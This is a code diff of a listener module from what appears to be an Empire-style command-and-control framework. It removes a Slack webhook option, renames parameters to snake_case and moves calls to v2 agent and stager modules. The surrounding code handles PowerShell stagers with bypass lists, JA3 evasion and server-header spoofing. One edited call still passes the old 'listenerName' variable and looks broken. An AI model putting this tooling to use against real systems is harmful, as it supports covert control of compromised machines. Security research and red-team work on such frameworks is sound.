@@ -122,11 +122,6 @@ class Listener:
                 "Required": True,
                 "Value": "Server:Microsoft-IIS/7.5",
             },
-            "SlackURL": {
-                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
-                "Required": False,
-                "Value": "",
-            },
             "JA3_Evasion": {
                 "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
                 "Required": False,
@@ -191,13 +186,13 @@ class Listener:
         encode=True,
         obfuscate=False,
         obfuscation_command="",
-        userAgent="default",
+        user_agent="default",
         proxy="default",
-        proxyCreds="default",
-        stagerRetries="0",
+        proxy_creds="default",
+        stager_retries="0",
         language=None,
-        safeChecks="",
-        listenerName=None,
+        safe_checks="",
+        listener_name=None,
         bypasses: list[str] | None = None,
     ):
         """
@@ -225,7 +220,7 @@ class Listener:
             # PowerShell
 
             stager = '$ErrorActionPreference = "SilentlyContinue";'
-            if safeChecks.lower() == "true":
+            if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                 for bypass in bypasses:
@@ -547,8 +542,8 @@ class Listener:
                 obfuscation_command = obfuscation_config.command
 
             if stager == "powershell":
-                return self.mainMenu.stagers.generate_launcher(
-                    listenerName=listenerName,
+                return self.mainMenu.stagergenv2.generate_launcher(
+                    listener_name=listenerName,
                     language="powershell",
                     encode=False,
                     obfuscate=obfuscation,
@@ -562,7 +557,7 @@ class Listener:
             """
             Before every request, check if the IP address is allowed.
             """
-            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
+            if not self.mainMenu.agentcommsv2.is_ip_allowed(request.remote_addr):
                 listenerName = self.options["Name"]["Value"]
                 message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
                 self.instance_log.debug(message)
@@ -655,7 +650,7 @@ class Listener:
                 return make_response(self.default_response(), 404)
 
             # parse the routing packet and process the results
-            dataResults = self.mainMenu.agents.handle_agent_data(
+            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                 stagingKey, routingPacket, listenerOptions, clientIP
             )
 
@@ -724,7 +719,7 @@ class Listener:
             except Exception:
                 requestData = None
 
-            dataResults = self.mainMenu.agents.handle_agent_data(
+            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                 stagingKey, requestData, listenerOptions, clientIP
             )
             if not dataResults or len(dataResults) <= 0:
@@ -738,7 +733,7 @@ class Listener:
                 if results.startswith(b"STAGE2"):
                     # TODO: document the exact results structure returned
                     sessionID = results.split(b" ")[1].strip().decode("UTF-8")
-                    sessionKey = self.mainMenu.agents.agents[sessionID]["sessionKey"]
+                    sessionKey = self.mainMenu.agentsv2.agents[sessionID]["sessionKey"]
 
                     listenerName = self.options["Name"]["Value"]
                     message = f"{listenerName}: Sending agent (stage 2) to {sessionID} at {clientIP}"
